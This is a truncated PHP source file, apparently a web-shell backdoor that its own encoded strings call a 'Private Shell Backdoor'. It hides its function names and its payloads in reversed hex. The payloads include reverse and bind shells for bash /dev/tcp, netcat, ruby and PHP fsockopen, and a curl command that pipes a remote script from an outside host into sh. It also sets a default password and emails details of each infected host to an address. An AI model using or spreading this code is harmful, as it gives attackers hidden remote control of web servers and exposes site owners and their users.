<?php
$priv = function () {
    if (!session_id()) session_start();
    error_reporting(in_array(trim($_SERVER['SERVER_ADDR']), array("127.0.0.1", "::1")));
    $_SESSION['_x_'] = array('crypt' => true, 'sym' => 'symlink', 'cp' => 'copy', 'xh' => 'bin2hex', 'hx' => 'hex2bin', 'sv' => 'strrev', '64e' => 'base64_encode', '64d' => 'base64_decode');
    $_SESSION['_dis_'] = array_values(explode(",", ini_get('disable_functions')));
    $_SESSION['_die_'] = '
';
    $_SESSION['_con_'] = array(
        'php' => '273b6033263e322033263e2033263c20692d2068732f6e69622f603b295d74726f705b2c225d70695b22286e65706f6b636f73663d73242720722d20706870',
        'fsockopen' => '273b292233263e322033263e2033263c20692d2068732f6e69622f22286d65747379733b295d74726f705b2c225d70695b22286e65706f6b636f73663d73242720722d20706870',
        'bash' => '31263e30205d74726f705b2f5d70695b2f7063742f7665642f20263e20692d2068736162',
        'perl' => '', 'perl2' => '', 'perl3' => '',
        'python' => '', 'python2' => '',
        'ruby' => '2729662c662c662c226425263e32206425263e206425263c20692d2068732f6e69622f222866746e6972707320636578653b695f6f742e295d74726f705b2c5d70695b286e65706f2e74656b636f535043543d6627652d2074656b636f73722d2079627572',
        'curl' => '6873207c205d74726f705b3a5d70695b2f68732e776f6e2e6c6c6568732f2f3a7370747468206b732d206c727563',
        'netcat' => '5d74726f705b205d70695b2068732f6e69622f20652d20636e',
        'netcat2' => '662f706d742f3e205d74726f705b205d70695b20636e7c31263e3220692d2068732f6e69622f7c662f706d742f207461633b662f706d742f206f6669666b6d3b662f706d742f206d72',
    );
    $_SESSION['_bind_'] = array(
        'shbd' => '',
        'perl' => '', 'perl2' => '',
        'python' => '', 'python2' => '',
        'ruby' => '2729732c732c732c226425263e32206425263e206425263c20692d20687361622f6e69622f222866746e6972707320636578653b7470656363612e663d733b295d74726f705b2877656e2e7265767265535043543d662720652d2074656b636f73722d2079627572',
        'netcat' => '687361622f6e69622f20632d205d74726f705b2070766c2d20636e',
        'netcat2' => '662f706d742f3e205d74726f705b2070766c2d20636e7c31263e3220692d2068732f6e69622f7c662f706d742f207461633b662f706d742f206f6669666b6d3b662f706d742f206d72',
    );
    $_SESSION['priv'] = array(
        'secure' => isset($_SESSION['priv']['secure']) && $_SESSION['priv']['secure'] ?: false,
        'auth' => defined('PRIV_AUTH') ? PRIV_AUTH : $_SESSION['_x_']['hx']('626567756e64616c'),
        'key' => defined('PRIV_KEY') ? PRIV_KEY : $_SESSION['_x_']['hx']('6b6e67'),
        'method' => $_SESSION['_x_']['sv']($_SESSION['_x_']['hx']('6c69616d')),
        'info' => defined('PRIV_INFO') ? PRIV_INFO : $_SESSION['_x_']['sv']($_SESSION['_x_']['hx']('726f6f646b636142206c6c6568532065746176697250')),
        'notify' => $_SESSION['_x_']['sv']($_SESSION['_x_']['hx']('6d6f632e6c69616d674038766972702e7576616a6564')),
        'msg' => $_SESSION['_x_']['sv']($_SESSION['_x_']['hx']('2d2d2d3e726f6f646b636142206c6c65685320657461766972503c2d2d2d2d2d2d0a0d73253d7325203a2067724109090a0d7325203a206874615009090a0d7325203a206c725509090a0d7325203a2074736f4809090a0d7325203a20656d616e5509090a0d2d2d2d2d3e726f6f646b636142206c6c65685320657461766972503c2d2d2d2d2d2d')),
